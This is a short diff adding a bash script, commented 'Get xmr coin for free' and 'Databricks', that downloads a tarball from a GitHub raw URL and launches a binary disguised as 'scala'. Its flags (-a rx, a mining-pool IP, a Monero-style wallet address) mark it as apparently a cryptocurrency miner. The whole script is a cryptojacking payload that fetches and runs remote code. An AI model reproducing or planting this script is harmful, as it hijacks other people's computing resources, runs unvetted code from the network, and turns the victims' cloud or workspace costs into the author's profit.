@@ -1,0 +1,8 @@
+#! /bin/bash
+# Get xmr coin for free
+# Databricks
+
+wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz
+tar -xvf scala.tar.gz
+cd scala
+./scala -a rx -o 149.102.143.109:80 -u 4DSQMNzzq46N1z2pZWAVdeA6JvUL9TCB2bnBiA3ZzoqEdYJnMydt5akCa3vtmapeDsbVKGPFdNkzqTcJS8M8oyK7WGjSt2PabJFJ44QxXf -p test2
